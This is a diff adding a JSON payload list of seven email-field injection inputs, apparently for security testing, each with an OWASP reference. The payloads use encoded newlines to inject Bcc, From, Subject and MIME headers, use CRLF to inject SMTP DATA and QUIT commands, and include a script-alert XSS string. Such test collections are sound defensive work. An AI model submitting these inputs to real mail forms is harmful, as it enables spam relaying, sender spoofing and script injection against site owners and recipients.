@@ -1,0 +1,72 @@
+[
+  {
+    "id": "email-001",
+    "family": "email_injection",
+    "subtype": "header_injection",
+    "payload_string": "user@example.com%0ABcc: evil@attacker.com",
+    "context": "string",
+    "description": "Email header injection to add BCC recipient",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-002",
+    "family": "email_injection",
+    "subtype": "header_injection",
+    "payload_string": "user@example.com%0ASubject: Injected Subject",
+    "context": "string",
+    "description": "Email header injection to override subject line",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-003",
+    "family": "email_injection",
+    "subtype": "smtp_injection",
+    "payload_string": "user@example.com\r\nDATA\r\nInjected message body",
+    "context": "string",
+    "description": "SMTP command injection via email field",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-004",
+    "family": "email_injection",
+    "subtype": "header_injection",
+    "payload_string": "user@example.com%0AFrom: admin@legitimate.com",
+    "context": "string",
+    "description": "Email header injection to spoof sender address",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-005",
+    "family": "email_injection",
+    "subtype": "xss",
+    "payload_string": "<script>alert(1)</script>@example.com",
+    "context": "string",
+    "description": "XSS payload embedded in email field for reflected XSS",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-006",
+    "family": "email_injection",
+    "subtype": "header_injection",
+    "payload_string": "user@example.com%0AMIME-Version: 1.0%0AContent-Type: text/html",
+    "context": "string",
+    "description": "Email header injection to change content type",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "email-007",
+    "family": "email_injection",
+    "subtype": "smtp_injection",
+    "payload_string": "user@example.com\r\nQUIT\r\n",
+    "context": "string",
+    "description": "SMTP injection to terminate session prematurely",
+    "references": ["https://owasp.org/www-community/vulnerabilities/Email_Header_Injection"],
+    "platform_specific": {}
+  }
+]
